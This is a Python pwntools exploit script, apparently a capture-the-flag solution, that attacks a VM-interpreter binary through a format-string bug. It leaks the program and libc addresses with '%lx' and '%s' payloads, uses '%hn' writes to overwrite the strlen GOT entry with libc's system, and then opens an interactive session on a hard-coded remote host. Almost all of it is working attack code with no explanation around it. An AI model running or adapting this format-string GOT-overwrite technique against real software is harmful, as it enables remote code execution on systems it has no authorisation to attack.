#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge")
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")

context.binary = exe
context.arch = 'amd64'
context.terminal = ["tilix", "-e"]

gdb_script = """
b len
c
"""

def get_bytes(value, start, amount):  
    shifted_value = value >> (start * 8) # Multiply by 8 for how much to right shift
    mask = make_mask(amount) 
    return shifted_value & mask

def make_mask(byte_amount):
    if byte_amount > 0:
        bin_string = '1' * (byte_amount * 8)  # Create binary string mask
    else:
        bin_string = '0'  # Make result 0
    return int(bin_string, 2)  # Return integer representation


def conn():
    if args.LOCAL:
        if args.GDB:
            runnable = gdb.debug([exe.path, "challenge.vm", "strings.vm"], gdb_script)
        else:
            runnable = process([exe.path, "challenge.vm", "strings.vm"])

        return runnable
    else:
        return remote("79.125.63.134", 3333)


def main():
    r = conn()
    # send files before interacting
    code_file = open("challenge.vm", "rb")
    r.send(code_file.read()+b'ENDOFTHEFILE')
    code_file.close()

    memory_file = open("strings.vm", "rb")
    r.send(memory_file.read()+b'ENDOFTHEFILE')
    memory_file.close()
    r.recvuntil(b"Starting challenge...\n")

    # Leak .data address
    r.sendline(b"%lx\0\n")
    exe.address = int(r.recvline(keepends=False), 16) - exe.symbols["output"]
    print("got.free =", hex(exe.got["free"]))

    # write [malloc] address to stack inside "output" variable
    to_write = get_bytes(exe.got["malloc"], 0, 2)
    r.sendline(b"%3$"+str(to_write).encode()+b"lx%6$hn\0\n")

    # Leak libc
    r.sendline(b"CUTHERE%13$s\0\n")
    r.recvuntil(b"CUTHERE")
    libc.address = u64(r.recvline(keepends=False)+b"\0\0") - libc.symbols["malloc"]
    print("libc.malloc =", hex(libc.symbols["malloc"]))

    # write [strlen] address to stack inside "output" variable
    to_write = get_bytes(exe.got["strlen"], 0, 2)
    r.sendline(b"%3$"+str(to_write).encode()+b"lx%6$hn\0\n")

    # write into [strlen]
    to_write = get_bytes(libc.symbols["system"], 0, 2)
    r.sendline(b"%3$"+str(to_write).encode()+b"lx%13$hn\0\n")
    print("libc.system = " + hex(libc.symbols["system"]))

    # write [strlen] address to stack inside "output" variable + 2 bytes
    to_write = get_bytes(exe.got["strlen"], 0, 2) + 2
    r.sendline(b"%3$"+str(to_write).encode()+b"lx%6$hn\0\n")

    # write into [strlen]
    to_write = get_bytes(libc.symbols["system"], 2, 2)
    r.sendline(b"%3$"+str(to_write).encode()+b"lx%13$hn\0\n")

    # terminate the VM read-write loop
    r.sendline(b"\0\n")

    r.interactive()


if __name__ == "__main__":
    main()
